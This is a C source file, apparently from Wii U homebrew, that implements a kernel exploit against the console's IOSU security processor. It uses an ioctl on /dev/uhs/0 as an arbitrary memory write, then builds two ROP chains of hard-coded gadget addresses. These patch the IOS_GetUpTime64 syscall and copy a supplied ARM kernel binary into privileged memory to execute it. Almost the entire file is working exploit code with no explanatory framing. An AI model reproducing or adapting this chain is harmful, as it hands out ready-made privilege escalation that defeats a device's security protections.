//Main.c
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <malloc.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include "dynamic_libs/os_functions.h"
#include "dynamic_libs/fs_functions.h"
#include "dynamic_libs/gx2_functions.h"
#include "dynamic_libs/sys_functions.h"
#include "dynamic_libs/vpad_functions.h"
#include "dynamic_libs/socket_functions.h"
#include "fs/fs_utils.h"
#include "fs/sd_fat_devoptab.h"
#include "system/memory.h"
#include "utils/logger.h"
#include "utils/utils.h"
#include "common/common.h"
#include "main.h"

#define CHAIN_START         0x1016AD40
#define SHUTDOWN            0x1012EE4C
#define SIMPLE_RETURN       0x101014E4
#define SOURCE              (0x120000)
#define IOS_CREATETHREAD    0x1012EABC
#define ARM_CODE_BASE       0x08135000
#define REPLACE_SYSCALL     0x081298BC

int dev_uhs_0_handle;

/* YOUR ARM CODE HERE (starts at ARM_CODE_BASE) */
#include "arm_kernel_bin.h"
#include "arm_user_bin.h"


/* ROP CHAIN STARTS HERE (0x1015BD78) */
int final_chain[] = {
   0x101236f3,        // 0x00      POP {R1-R7,PC}
   0x0,               // 0x04      arg
   0x0812974C,        // 0x08      stackptr     CMP R3, #1; STREQ R1, [R12]; BX LR
   0x68,              // 0x0C      stacksize
   0x10101638,        // 0x10
   0x0,               // 0x14
   0x0,               // 0x18
   0x0,               // 0x1C
   0x1010388C,        // 0x20      CMP R3, #0; MOV R0, R4; LDMNEFD SP!, {R4,R5,PC}
   0x0,               // 0x24
   0x0,               // 0x28
   0x1012CFEC,        // 0x2C      MOV LR, R0; MOV R0, LR; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x30
   0x0,               // 0x34
   IOS_CREATETHREAD,  // 0x38
   0x1,               // 0x3C
   0x2,               // 0x40
   0x10123a9f,        // 0x44      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x00, // 0x48      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE92D4010,        // 0x4C      value: PUSH {R4,LR}
   0x0,               // 0x50
   0x10123a8b,        // 0x54      POP {R3,R4,PC}
   0x1,               // 0x58      R3 must be 1 for the arbitrary write
   0x0,               // 0x5C
   0x1010CD18,        // 0x60      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x64
   0x0,               // 0x68
   0x1012EE64,        // 0x6C      set_panic_behavior (arbitrary write)
   0x0,               // 0x70
   0x0,               // 0x74
   0x10123a9f,        // 0x78      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x04, // 0x7C      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A04000,        // 0x80      value: MOV R4, R0
   0x0,               // 0x84
   0x10123a8b,        // 0x88      POP {R3,R4,PC}
   0x1,               // 0x8C      R3 must be 1 for the arbitrary write
   0x0,               // 0x90
   0x1010CD18,        // 0x94      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x98
   0x0,               // 0x9C
   0x1012EE64,        // 0xA0      set_panic_behavior (arbitrary write)
   0x0,               // 0xA4
   0x0,               // 0xA8
   0x10123a9f,        // 0xAC      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x08, // 0xB0      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE3E00000,        // 0xB4      value: MOV R0, #0xFFFFFFFF
   0x0,               // 0xB8
   0x10123a8b,        // 0xBC      POP {R3,R4,PC}
   0x1,               // 0xC0      R3 must be 1 for the arbitrary write
   0x0,               // 0xC4
   0x1010CD18,        // 0xC8      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0xCC
   0x0,               // 0xD0
   0x1012EE64,        // 0xD4      set_panic_behavior (arbitrary write)
   0x0,               // 0xD8
   0x0,               // 0xDC
   0x10123a9f,        // 0xE0      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x0C, // 0xE4      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE030F10,        // 0xE8      value: MCR   P15, #0, R0, C3, C0, #0 (set dacr to R0)
   0x0,               // 0xEC
   0x10123a8b,        // 0xF0      POP {R3,R4,PC}
   0x1,               // 0xF4      R3 must be 1 for the arbitrary write
   0x0,               // 0xF8
   0x1010CD18,        // 0xFC      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x100
   0x0,               // 0x104
   0x1012EE64,        // 0x108     set_panic_behavior (arbitrary write)
   0x0,               // 0x10C
   0x0,               // 0x110
   0x10123a9f,        // 0x114     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x10, // 0x118     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A00004,        // 0x11C     value: MOV R0, R4
   0x0,               // 0x120
   0x10123a8b,        // 0x124     POP {R3,R4,PC}
   0x1,               // 0x128     R3 must be 1 for the arbitrary write
   0x0,               // 0x12C
   0x1010CD18,        // 0x130     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x134
   0x0,               // 0x138
   0x1012EE64,        // 0x13C     set_panic_behavior (arbitrary write)
   0x0,               // 0x140
   0x0,               // 0x144
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x14, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE12FFF33,        // 0x150     value: BLX R3 KERNEL_MEMCPY
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x18, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0x00000000,        // 0x150     value: NOP
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x1C, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE17FF7A,        // 0x150     value: clean_loop: MRC p15, 0, r15, c7, c10, 3
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x20, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0x1AFFFFFD,        // 0x150     value: BNE clean_loop
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x24, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE070F9A,        // 0x150     value: MCR p15, 0, R0, c7, c10, 4
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x17C     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x28, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A03004,        // 0x184     value: MOV R3, R4
   0x0,               // 0x188
   0x10123a8b,        // 0x18C     POP {R3,R4,PC}
   0x1,               // 0x190     R3 must be 1 for the arbitrary write
   0x0,               // 0x194
   0x1010CD18,        // 0x198     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x19C
   0x0,               // 0x1A0
   0x1012EE64,        // 0x1A4     set_panic_behavior (arbitrary write)
   0x0,               // 0x1A8
   0x0,               // 0x1AC
   0x10123a9f,        // 0x17C     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x2C, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE8BD4010,        // 0x184     value: POP {R4,LR}
   0x0,               // 0x188
   0x10123a8b,        // 0x18C     POP {R3,R4,PC}
   0x1,               // 0x190     R3 must be 1 for the arbitrary write
   0x0,               // 0x194
   0x1010CD18,        // 0x198     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x19C
   0x0,               // 0x1A0
   0x1012EE64,        // 0x1A4     set_panic_behavior (arbitrary write)
   0x0,               // 0x1A8
   0x0,               // 0x1AC
   0x10123a9f,        // 0x1B0     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x30, // 0x1B4     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE12FFF13,        // 0x1B8     value: BX R3 our code :-)
   0x0,               // 0x1BC
   0x10123a8b,        // 0x1C0     POP {R3,R4,PC}
   0x1,               // 0x1C4     R3 must be 1 for the arbitrary write
   0x0,               // 0x1C8
   0x1010CD18,        // 0x1CC     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x1D0
   0x0,               // 0x1D4
   0x1012EE64,        // 0x1D8     set_panic_behavior (arbitrary write)
   0x0,               // 0x1DC
   0x0,               // 0x1E0
   0x10123a9f,        // 0x1E4     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL,        // 0x1DC     start of syscall IOS_GetUpTime64
   0x4001,            // 0x1E0     on > 0x4000 it flushes all data caches
   0x0,               // 0x1E0
   0x1012ED4C,        // 0x1E4     IOS_FlushDCache(void *ptr, unsigned int len)
   0x0,               // 0x1DC
   0x0,               // 0x1E0
   0x10123a9f,        // 0x1E4     POP {R0,R1,R4,PC}
   ARM_CODE_BASE,     // 0x1E8     our code destination address
   0x0,               // 0x1EC
   0x0,               // 0x1F0
   0x101063db,        // 0x1F4     POP {R1,R2,R5,PC}
   0x0,               // 0x1F8
   sizeof(arm_kernel_bin),   // 0x1FC     our code size
   0x0,               // 0x200
   0x10123983,        // 0x204     POP {R1,R3,R4,R6,PC}
   0x00140000,        // 0x208     our code source location
   0x08131D04,        // 0x20C     KERNEL_MEMCPY address
   0x0,               // 0x210
   0x0,               // 0x214
   0x1012EBB4,        // 0x218     IOS_GetUpTime64 (privileged stack pivot)
   0x0,
   0x0,
   0x101312D0,
};

int second_chain[] = {
   0x10123a9f, // 0x00         POP {R0,R1,R4,PC}
   CHAIN_START + 0x14 + 0x4 + 0x20 - 0xF000,     // 0x04         destination
   0x0,        // 0x08
   0x0,        // 0x0C
   0x101063db, // 0x10         POP {R1,R2,R5,PC}
   0x00130000, // 0x14         source
   sizeof(final_chain),          // 0x18         length
   0x0,        // 0x1C
   0x10106D4C, // 0x20         BL MEMCPY; MOV R0, #0; LDMFD SP!, {R4,R5,PC}
   0x0,        // 0x24
   0x0,        // 0x28
   0x101236f3, // 0x2C         POP {R1-R7,PC}
   0x0,        // 0x30         arg
   0x101001DC, // 0x34         stackptr
   0x68,       // 0x38         stacksize
   0x10101634, // 0x3C         proc: ADD SP, SP, #8; LDMFD SP!, {R4,R5,PC}
   0x0,        // 0x40
   0x0,        // 0x44
   0x0,        // 0x48
   0x1010388C, // 0x4C         CMP R3, #0; MOV R0, R4; LDMNEFD SP!, {R4,R5,PC}
   0x0,        // 0x50
   0x0,        // 0x54
   0x1012CFEC, // 0x58         MOV LR, R0; MOV R0, LR; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,        // 0x5C
   0x0,        // 0x60
   IOS_CREATETHREAD, // 0x64
   0x1,        // 0x68         priority
   0x2,        // 0x6C         flags
   0x0,        // 0x70
   0x0,        // 0x74
   0x101063db, // 0x78         POP {R1,R2,R5,PC}
   0x0,        // 0x7C
   -(0x240 + 0x18 + 0xF000), // 0x80  stack offset
   0x0,        // 0x84
   0x101141C0, // 0x88         MOV R0, R9; ADD SP, SP, #0xC; LDMFD SP!, {R4-R11,PC}
   0x0,
   0x0,
   0x0,
   0x00110000 - 0x44, // 0x8C
   0x00110010,        // 0x90
   0x0,        // 0x94
   0x0,        // 0x98
   0x0,        // 0x9C
   0x0,        // 0xA0
   0x0,        // 0xA4
   0x4,        // 0xA8         R11 must equal 4 in order to pivot the stack
   0x101088F4, //              STR R0, [R4,#0x44]; MOVEQ R0, R5; STRNE R3, [R5]; LDMFD SP!, {R4,R5,PC}
   0x0,
   0x0,
   0x1012EA68, // 0xAC         stack pivot
};

static int patchesDone = 0;

int Menu_Main(void)
{
	//!---------INIT---------
	InitOSFunctionPointers();                  //! Init coreinit functions adresses


    u64 currenTitleId = OSGetTitleID();
    // in case we are not in mii maker but in system menu we start the installation
    if (currenTitleId != 0x000500101004A200 && // mii maker eur
        currenTitleId != 0x000500101004A100 && // mii maker usa
        currenTitleId != 0x000500101004A000 && // mii maker jpn
        currenTitleId != 0x0005000013374842)   // HBL channel
    {
        return EXIT_RELAUNCH_ON_LOAD;
    }
    else if(patchesDone)
    {
        return 0;
    }

	InitSysFunctionPointers();                  //! Init coreinit functions adresses
	InitSocketFunctionPointers();                  //! Init coreinit functions adresses
    InitFSFunctionPointers();
    //OSForceFullRelaunch();
    SYSLaunchMenu();

    dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0);   //! Open /dev/uhs/0 IOS node
    uhs_exploit_init();                        //! Init variables for the exploit

                                               //!------ROP CHAIN-------

    uhs_write32(CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
    uhs_write32(CHAIN_START + 0x10, 0x1011814C);
    uhs_write32(CHAIN_START + 0xC, SOURCE);

    uhs_write32(CHAIN_START, 0x1012392b); // pop {R4-R6,PC}

    IOS_Close(dev_uhs_0_handle);

    patchesDone = 1;
    return EXIT_RELAUNCH_ON_LOAD;
}

//!------Variables used in exploit------
int *pretend_root_hub = (int*)0xF5003ABC;
int *ayylmao = (int*)0xF4500000;
//!-------------------------------------

void uhs_exploit_init() {
   ayylmao[5] = 1;
   ayylmao[8] = 0x500000;

   memcpy((char*)(0xF4120000), second_chain, sizeof(second_chain));
   memcpy((char*)(0xF4130000), final_chain, sizeof(final_chain));
   memcpy((char*)(0xF4140000), arm_kernel_bin, sizeof(arm_kernel_bin));
   memcpy((char*)(0xF4148000), arm_user_bin, sizeof(arm_user_bin));

   pretend_root_hub[33] = 0x500000;
   pretend_root_hub[78] = 0;

   DCFlushRange(pretend_root_hub + 33, 200);      //! |Make CPU fetch new data (with updated vals)
   DCFlushRange((void*)0xF4120000, sizeof(second_chain));      //! |Make CPU fetch new data (with updated vals)
   DCFlushRange((void*)0xF4130000, sizeof(final_chain));      //! |Make CPU fetch new data (with updated vals)
   DCFlushRange((void*)0xF4140000, sizeof(arm_kernel_bin));      //! |Make CPU fetch new data (with updated vals)
   DCFlushRange((void*)0xF4148000, sizeof(arm_user_bin));      //! |Make CPU fetch new data (with updated vals)
}

int uhs_write32(int arm_addr, int val) {
   ayylmao[520] = arm_addr - 24;                  //!  The address to be overwritten, minus 24 bytes
   DCFlushRange(ayylmao, 521 * 4);                //! |Make CPU fetch new data (with updated adress)
   DCInvalidateRange(ayylmao, 521 * 4);           //! |for "ayylmao"
   OSSleepTicks(0x200000);                        //!  Improves stability
   int request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
   int output_buffer[32];
   return IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
}
